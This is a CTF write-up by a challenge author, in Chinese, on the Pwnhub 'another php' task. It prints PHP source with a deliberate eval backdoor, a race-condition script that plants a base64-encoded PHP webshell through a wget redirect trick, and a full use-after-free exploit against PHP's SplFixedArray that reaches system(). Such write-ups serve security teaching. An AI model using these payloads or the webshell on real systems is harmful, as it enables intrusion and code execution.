<!doctype html>
<html lang="en">
    <head>
		
        <meta http-equiv="Content-Type" content="text/html" charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta name="description" content="venenof7's blog">
        <link rel="shortcut icon" href="/styles/ven.pic.jpg"/>
        <link rel="canonical" href="http://guolinn.com/">
        <link rel="alternate" type="application/rss+xml" title="venenof7" href="">
        <title>Pwnhub-another php-WP | venenof7&#39;s blog</title>
        <meta name="description" content="{{meta_description}}">

        <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
        <link rel="stylesheet" type="text/css" href="/styles/crisp.css">
        <meta name="HandheldFriendly" content="True" />
        <meta name="MobileOptimized" content="320" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
        <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
        <![endif]-->

    <meta name="generator" content="Hexo 6.3.0"></head>
    
		<body class="post-template">
	

        <header id="header">
            <a id="logo" href="/"><img src="/styles/ven.pic.jpg" alt="venenof7's blog" /></a>
            <h1><a href="/">venenof7</a></h1>
            <a href="https://nu1l.com" target="_blank"><p style="color:#5cc2c0">Nu1L Team</p></a>
            <div id="follow-icons">
              </div>
<h6><a href="/about">About</a></h6>
        </header>

        <main id="content">
        <meta name="referrer" content="no-referrer" />


<article class="post">
  三月 13, 2017
  
    <span class="taglist">  &middot; 
    
    
      <a href='/tags/ctf/'>ctf</a> 
    
    </span>
  

  <h1 class="post-title">Pwnhub-another php-WP</h1>
  <section class="post-content article-entry">
    <p>有幸作为题目的出题人，强行给晨升大佬的pwn套了一个web</p>
<p>another php共分为两部分，web&amp;pwn</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="variable">$firesun_path</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwnhub</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pwnhub&#x27;</span>])==<span class="string">&quot;firesun&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hacked by Firesun!&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pwnhub&#x27;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwnhubfile</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$firesun_path</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$firesun_path</span> . <span class="string">&#x27;/firesun&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">register_shutdown_function</span>(<span class="string">&#x27;pwnhubfile&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_context</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_SESSION</span>, <span class="variable">$firesun_path</span>;</span><br><span class="line">    <span class="variable">$firesun_path</span> = <span class="string">&#x27;/var/www/data/&#x27;</span> . <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$firesun_path</span>)) <span class="title function_ invoke__">mkdir</span>(<span class="variable">$firesun_path</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$firesun_path</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="string">&#x27;firesun&#x27;</span>)) <span class="variable">$_SESSION</span> = <span class="keyword">array</span>(); <span class="keyword">else</span> <span class="variable">$_SESSION</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;firesun&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download_image</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$origUrl</span> = <span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]) &amp;&amp; <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>] == <span class="string">&#x27;http&#x27;</span>) <span class="keyword">if</span> (<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>] == <span class="string">&#x27;/pwnhub.png&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$url</span>[<span class="string">&#x27;query&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;byebyebye&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="title function_ invoke__">wget_wrapper</span>(<span class="variable">$origUrl</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Nice:)&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;sorry!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$sessId</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="number">10</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$sessId</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$sessId</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line"><span class="title function_ invoke__">set_context</span>(<span class="variable">$sessId</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;image&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;image&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$p</span>, <span class="string">&#x27;php&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;wow!!!&#x27;</span>;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;byebye&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$pq</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$pqq</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;?&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$pq</span>);</span><br><span class="line">        <span class="title function_ invoke__">download_image</span>(<span class="variable">$pqq</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;pwnhub.jpg&quot; width=184 height=200/&gt;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;no image:(&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- pwnhubs0urcec0d3.zip --&gt;</span><br></pre></td></tr></table></figure>
<p>漏洞的关键点其实很明显，就是Pwnhub类中的magic函数中的RCE，但是阅读代码发现，Pwnhub这个类并没有被实例化调用。同时因为pwnhubfile函数的存在，并且$_SESSION[‘id’]是我们不可控的，那么这样就导致了firesun文件的内容都是array()。<br>于是摆在这里的第一个问题，那就是firesun的内容怎么控制?<br>在download_image()函数中，封装了一个完全等于wget的函数wget_wrapper，而wegt的版本够低。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]) &amp;&amp; <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>] == <span class="string">&#x27;http&#x27;</span>) <span class="keyword">if</span> (<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>] == <span class="string">&#x27;/pwnhub.png&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$url</span>[<span class="string">&#x27;query&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;byebyebye&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="title function_ invoke__">wget_wrapper</span>(<span class="variable">$origUrl</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Nice:)&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;sorry!&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>而在wget的低版本中存在302的跳转漏洞，也就是如果我们重定向到一个ftp地址的话，服务器就会wget你ftp上的相应文件，而不是最初url的文件。所以，这就意味着，firesun的内容我们是可控的。<br>于是我们现在只有能够触发下面这个条件就可以实现RCE:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="variable">$_SESSION</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;firesun&#x27;</span>));</span><br></pre></td></tr></table></figure>
<p>其实后面就是一个比较简单的点了，利用race condition，让服务器wget的firesun赶在file_put_contents之前生成，这样也就会导致了Pwnhub类被实例化，从而导致了RCE，给出自己的payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- utf8 -*-</span></span><br><span class="line">import gevent.pool</span><br><span class="line">import gevent.monkey</span><br><span class="line">import requests</span><br><span class="line">COOKIES = &#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;a7labfa9p995hpda8340rasju73&#x27;</span> </span><br><span class="line">&#125;</span><br><span class="line">def <span class="title function_ invoke__">main</span>():</span><br><span class="line">    pool = gevent.pool.<span class="title function_ invoke__">Pool</span>(<span class="number">20</span>)</span><br><span class="line">    pool.<span class="title function_ invoke__">map</span>(do_job, [i <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">40</span>)])</span><br><span class="line">def <span class="title function_ invoke__">do_job</span>(num):</span><br><span class="line">    payload = &#123;<span class="string">&#x27;image&#x27;</span>:<span class="string">&#x27;http://150.95.155.106/pwnhub.png&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pwnhub&#x27;</span>:<span class="string">&#x27;ZmlsZV9wdXRfY29udGVudHMoIi92YXIvd3d3L2h0bWwvMmQ5YmM2MjVhY2IxYmE1ZDBkYjZmOGQwYzhiOWQyMDYvaW1hZ2UvdmVuLnBocCIsIjw/cGhwIGV2YWwoYmFzZTY0X2RlY29kZShcJF9QT1NUWzEyM10pKTs/PiIpOw==&#x27;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    r = requests.<span class="title function_ invoke__">post</span>(<span class="string">&quot;http://52.80.32.116/2d9bc625acb1ba5d0db6f8d0c8b9d206/a9b4d7cc810da015142f61f7e236d50b.php?pwnhub=firesun&quot;</span>, data=payload, cookies=COOKIES)</span><br><span class="line">    <span class="keyword">print</span>(<span class="title function_ invoke__">str</span>(num) + <span class="string">&#x27;|&#x27;</span> + r.text)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    gevent.monkey.<span class="title function_ invoke__">patch_socket</span>()</span><br><span class="line">    <span class="title function_ invoke__">main</span>()</span><br></pre></td></tr></table></figure>

<p>差不多改两三次cookie就OK写入shell:<br><img src="https://cdn.nlark.com/yuque/0/2023/png/21442249/1673254157464-3f67fca2-d867-483b-8a3b-736e54718ff2.png" alt="image.png"><br>至此，web部分结束，拿到shell，但是看了眼phpinfo上的disable_functions：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/21442249/1673254172347-c3c78cff-90b7-48c2-ba5e-13dd11710aad.png" alt="image.png"><br>貌似没有shell绕过的可能性XD</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>拿到webshell之后可以查看phpinfo();， 发现命令执行相关的函数如system,exec,passthru等都被禁用了。 也没有可行的方法寻找flag。<br>根据php.diff，可以得知修改部分在php的SplFixedArray类中，作者为SplFixedArray新增了序列化与反序列化方法。简单阅读修改部分可以发现bug存在于反序列化过程中：如果php_var_unserialize失败，会调用zval_ptr_dtor减少对应zval的引用计数，从而导致其被释放，造成use-after-free。通过伪造zval可以达到任意地址读写与代码执行。<br>拿到reverse shell之后，在根目录发现flag.txt，用flag_reader程序可以读出flag。</p>
<blockquote>
<p>P.S. ：其实本来是想再加上open_basedir的，但是由于我没时间(比较懒)，就没有加。加上之后利用方法基本上就和HITCON-CTF2015的Use-after-flee那一题基本一样了。</p>
</blockquote>
<p>利用脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readmem</span>(<span class="params"><span class="variable">$address</span>, <span class="variable">$length</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$inner</span> = <span class="string">&#x27;x:3;i:0;i:0;i:1;s:8:&quot;AAAAAAAA&quot;;i:2;?:2;&#x27;</span>;</span><br><span class="line">    <span class="variable">$fakezval</span> = <span class="title function_ invoke__">ptr2str</span>(<span class="variable">$address</span>);</span><br><span class="line">    <span class="variable">$fakezval</span> .= <span class="title function_ invoke__">ptr2str</span>(<span class="variable">$length</span>);</span><br><span class="line">    <span class="variable">$fakezval</span> .= <span class="string">&quot;\x00\x00\x00\xff&quot;</span>;</span><br><span class="line">    <span class="variable">$fakezval</span> .= <span class="string">&quot;\x06&quot;</span>;</span><br><span class="line">    <span class="variable">$fakezval</span> .= <span class="string">&quot;\x00&quot;</span>;</span><br><span class="line">    <span class="variable">$fakezval</span> .= <span class="string">&quot;\x00\x00&quot;</span>;</span><br><span class="line">    <span class="variable">$inner2</span> = <span class="string">&#x27;s:&#x27;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$fakezval</span>).<span class="string">&#x27;:&quot;&#x27;</span>.<span class="variable">$fakezval</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">    <span class="variable">$mid</span> = <span class="string">&#x27;x:6;i:0;s:1:&quot;0&quot;;i:1;s:1:&quot;1&quot;;i:2;C:13:&quot;SplFixedArray&quot;:&#x27;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$inner</span>).<span class="string">&#x27;:&#123;&#x27;</span>.<span class="variable">$inner</span>.<span class="string">&#x27;&#125;i:3;&#x27;</span>.<span class="variable">$inner2</span>.<span class="string">&#x27;;i:4;&#x27;</span>.<span class="variable">$inner2</span>.<span class="string">&#x27;;i:5;&#x27;</span>.<span class="variable">$inner2</span>.<span class="string">&#x27;;&#x27;</span>;</span><br><span class="line">    <span class="variable">$a</span> = <span class="string">&#x27;C:13:&quot;SplFixedArray&quot;:&#x27;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$mid</span>).<span class="string">&#x27;:&#123;&#x27;</span>.<span class="variable">$mid</span>.<span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>[<span class="number">2</span>][<span class="number">2</span>], <span class="number">0</span>, <span class="variable">$length</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parse_libc</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$maps</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;#([0-9a-f]+)\-[0-9a-f]+.+/.+libc\-.+#&#x27;</span>, <span class="variable">$maps</span>, <span class="variable">$r</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$r</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$libc</span> = <span class="title function_ invoke__">parse_libc</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;libc_base = &quot;</span>.<span class="variable">$libc</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$system</span> = <span class="title function_ invoke__">ptr2str</span>(<span class="variable">$libc</span> + <span class="number">0x46590</span>);</span><br><span class="line"><span class="variable">$bss</span> = <span class="variable">$libc</span> + <span class="number">0x3C0000</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$array = array();</span></span><br><span class="line"><span class="comment">for($i = 0;$i&lt;10;$i+=2) &#123;</span></span><br><span class="line"><span class="comment">    $array[$i] = &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">FOR($i=0;$i&lt;10;$i++) &#123;</span></span><br><span class="line"><span class="comment">    $array[$i] = $i;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$inner</span> = <span class="string">&#x27;x:3;i:0;i:0;i:1;s:8:&quot;AAAAAAAA&quot;;i:2;?:2;&#x27;</span>;</span><br><span class="line"><span class="variable">$fakezval</span> = <span class="title function_ invoke__">ptr2str</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$fakezval</span> .= <span class="title function_ invoke__">ptr2str</span>(<span class="number">0x7fffffff</span>);</span><br><span class="line"><span class="variable">$fakezval</span> .= <span class="string">&quot;\x01\x00\x00\x00&quot;</span>;</span><br><span class="line"><span class="variable">$fakezval</span> .= <span class="string">&quot;\x06&quot;</span>;</span><br><span class="line"><span class="variable">$fakezval</span> .= <span class="string">&quot;\x00&quot;</span>;</span><br><span class="line"><span class="variable">$fakezval</span> .= <span class="string">&quot;\x00\x00&quot;</span>;</span><br><span class="line"><span class="variable">$inner2</span> = <span class="string">&#x27;s:&#x27;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$fakezval</span>).<span class="string">&#x27;:&quot;&#x27;</span>.<span class="variable">$fakezval</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$mid</span> = <span class="string">&#x27;x:7;i:0;s:1:&quot;0&quot;;i:1;s:1:&quot;1&quot;;i:2;C:13:&quot;SplFixedArray&quot;:&#x27;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$inner</span>).<span class="string">&#x27;:&#123;&#x27;</span>.<span class="variable">$inner</span>.<span class="string">&#x27;&#125;i:3;&#x27;</span>.<span class="variable">$inner2</span>.<span class="string">&#x27;;i:4;&#x27;</span>.<span class="variable">$inner2</span>.<span class="string">&#x27;;i:5;&#x27;</span>.<span class="variable">$inner2</span>.<span class="string">&#x27;;i:5;?:5;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;C:13:&quot;SplFixedArray&quot;:&#x27;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$mid</span>).<span class="string">&#x27;:&#123;&#x27;</span>.<span class="variable">$mid</span>.<span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$data</span>[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* avoid calling free */</span></span><br><span class="line"><span class="variable">$inner1</span> = <span class="string">&#x27;x:3;i:0;i:0;i:1;s:8:&quot;AAAAAAAA&quot;;i:2;?:2;&#x27;</span>;</span><br><span class="line"><span class="variable">$fakezval1</span> = <span class="title function_ invoke__">ptr2str</span>(<span class="variable">$bss</span>);</span><br><span class="line"><span class="variable">$fakezval1</span> .= <span class="title function_ invoke__">ptr2str</span>(<span class="number">8</span>);</span><br><span class="line"><span class="variable">$fakezval1</span> .= <span class="string">&quot;\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"><span class="variable">$fakezval1</span> .= <span class="string">&quot;\x06&quot;</span>;</span><br><span class="line"><span class="variable">$fakezval1</span> .= <span class="string">&quot;\x00&quot;</span>;</span><br><span class="line"><span class="variable">$fakezval1</span> .= <span class="string">&quot;\x00\x00&quot;</span>;</span><br><span class="line"><span class="variable">$inner2</span> = <span class="string">&#x27;s:&#x27;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$fakezval1</span>).<span class="string">&#x27;:&quot;&#x27;</span>.<span class="variable">$fakezval1</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$mid</span> = <span class="string">&#x27;x:6;i:0;s:1:&quot;0&quot;;i:1;s:1:&quot;1&quot;;i:2;C:13:&quot;SplFixedArray&quot;:&#x27;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$inner1</span>).<span class="string">&#x27;:&#123;&#x27;</span>.<span class="variable">$inner1</span>.<span class="string">&#x27;&#125;i:3;&#x27;</span>.<span class="variable">$inner2</span>.<span class="string">&#x27;;i:4;&#x27;</span>.<span class="variable">$inner2</span>.<span class="string">&#x27;;i:5;&#x27;</span>.<span class="variable">$inner2</span>.<span class="string">&#x27;;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;C:13:&quot;SplFixedArray&quot;:&#x27;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$mid</span>).<span class="string">&#x27;:&#123;&#x27;</span>.<span class="variable">$mid</span>.<span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$data1</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$y</span> = <span class="variable">$data1</span>[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line"><span class="variable">$y</span>[<span class="number">0</span>] = <span class="variable">$system</span>[<span class="number">0</span>];</span><br><span class="line"><span class="variable">$y</span>[<span class="number">1</span>] = <span class="variable">$system</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$y</span>[<span class="number">2</span>] = <span class="variable">$system</span>[<span class="number">2</span>];</span><br><span class="line"><span class="variable">$y</span>[<span class="number">3</span>] = <span class="variable">$system</span>[<span class="number">3</span>];</span><br><span class="line"><span class="variable">$y</span>[<span class="number">4</span>] = <span class="variable">$system</span>[<span class="number">4</span>];</span><br><span class="line"><span class="variable">$y</span>[<span class="number">5</span>] = <span class="variable">$system</span>[<span class="number">5</span>];</span><br><span class="line"><span class="variable">$y</span>[<span class="number">6</span>] = <span class="variable">$system</span>[<span class="number">6</span>];</span><br><span class="line"><span class="variable">$y</span>[<span class="number">7</span>] = <span class="variable">$system</span>[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;/tmp/a&quot;</span>, <span class="string">&quot;bash -c &#x27;echo 123 &gt; /tmp/hello&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$inner_1</span> = <span class="string">&#x27;x:3;i:0;i:0;i:1;s:8:&quot;AAAAAAAA&quot;;i:2;?:2;&#x27;</span>;</span><br><span class="line"><span class="variable">$fakezval_1</span> = <span class="string">&quot;sh /*/a;&quot;</span>;</span><br><span class="line"><span class="variable">$fakezval_1</span> .= <span class="title function_ invoke__">ptr2str</span>(<span class="variable">$bss</span>-<span class="number">8</span>);</span><br><span class="line"><span class="variable">$fakezval_1</span> .= <span class="string">&quot;\x01\x00\x00\x00&quot;</span>;</span><br><span class="line"><span class="variable">$fakezval_1</span> .= <span class="string">&quot;\x05&quot;</span>;</span><br><span class="line"><span class="variable">$fakezval_1</span> .= <span class="string">&quot;\x00&quot;</span>;</span><br><span class="line"><span class="variable">$fakezval_1</span> .= <span class="string">&quot;\x00\x00&quot;</span>;</span><br><span class="line"><span class="variable">$inner_2</span> = <span class="string">&#x27;s:&#x27;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$fakezval_1</span>).<span class="string">&#x27;:&quot;&#x27;</span>.<span class="variable">$fakezval_1</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$mid_1</span> = <span class="string">&#x27;x:6;i:0;s:1:&quot;0&quot;;i:1;s:1:&quot;1&quot;;i:2;C:13:&quot;SplFixedArray&quot;:&#x27;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$inner_1</span>).<span class="string">&#x27;:&#123;&#x27;</span>.<span class="variable">$inner_1</span>.<span class="string">&#x27;&#125;i:3;&#x27;</span>.<span class="variable">$inner_2</span>.<span class="string">&#x27;;i:4;&#x27;</span>.<span class="variable">$inner_2</span>.<span class="string">&#x27;;i:5;&#x27;</span>.<span class="variable">$inner_2</span>.<span class="string">&#x27;;&#x27;</span>;</span><br><span class="line"><span class="variable">$a_1</span> = <span class="string">&#x27;C:13:&quot;SplFixedArray&quot;:&#x27;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$mid_1</span>).<span class="string">&#x27;:&#123;&#x27;</span>.<span class="variable">$mid_1</span>.<span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$data_8</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a_1</span>);</span><br><span class="line"><span class="variable">$data_8</span>[<span class="number">2</span>][<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Done!\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

  </section>
  <footer class="post-footer">
    <!--
    <section class="author">
      <h4>venenof7</h4>
      <p></p>
    </section>
    -->
  </footer>
</article>

<nav class="pagination" role="pagination">
    
    <a class="newer-posts" href="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF-easy-laravel-Writeup/">
        ← prev <!--护网杯-easy laravel-Writeup-->
    </a>
    
    <span class="page-number">•</span>
    
</nav>

        </main>
        <footer id="footer">
            <section id="footer-message">&copy; 2023 venenof7. All rights reserved.</section>
        </footer>
    </body>
</html>


